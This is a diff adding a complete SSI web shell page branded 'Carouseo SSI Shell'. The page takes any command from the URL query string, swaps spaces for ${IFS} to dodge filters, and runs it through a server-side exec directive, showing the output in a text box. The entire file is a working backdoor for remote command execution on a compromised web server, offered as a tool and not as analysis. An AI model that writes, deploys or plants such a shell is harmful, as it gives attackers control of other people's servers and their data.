@@ -1,0 +1,39 @@
+<!--#config errmsg="[Unknown Error!]"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="mkdir a" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<html>
+
+<head>
+  <title>Carouseo SSI Shell</title>
+  <link href=https://1.bp.blogspot.com/-NcFB4m944Qw/YJcOCIop0uI/AAAAAAAAA4E/yw5Oahakh4sXKsQNnrkqeXBTKqFwoZlAACLcBGAsYHQ/s554/mickey-mouse.png rel=icon />
+  <link href=https://fonts.googleapis.com/css?family=Sedgwick+Ave rel=stylesheet>
+  <style>
+    body {
+      background-color: #263238;
+      color: white;
+      font-family: Sedgwick Ave;
+      text-align: center;
+    }
+  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+  <script language="javascript">function fex() { var uri = document.getElementById('command').value; var rep = uri.replace(/[ ]/g, '${IFS}'); var res = encodeURI(uri); document.location.href = "<!--#echo var=DOCUMENT_NAME -->? " +encodeURI(rep) ;}</script>
+  <script>document.onkeydown = keydown; function keydown(e) { if (!e) e = event; if (e.keyCode === 13) { var uri = document.getElementById('command').value; var rep = uri.replace(/[ ]/g, '${IFS}'); var res = encodeURI(uri); document.location.href = "<!--#echo var=DOCUMENT_NAME -->? " +encodeURI(rep) ; }}</script>
+</head>
+
+<body>
+  <center><b><a style=color:white;text-decoration:none; href="#">
+        <font face=Sedgwick+Ave size=6>Carouseo SSI Shell</font>
+      </a></b><br><br>
+    <font size=5>carou@seo:~$ <input type=text size=60 id=command class="text" name="peler" required>
+      <input type=button style=color:white;background-color:#808080; value=Execute! onclick="fex();">
+      <br><br>
+      <font size=3>Output: <!--#echo var=shl --></font>
+    </font><br><textarea bgcolor=#e4e0d8 cols=120 rows=15><!--#exec cmd=$shl --></textarea>
+    <center><a style=color:white;text-decoration:none; href="#"><br>&copy; CAROU SEO</center>
+</body>
+
+</html>
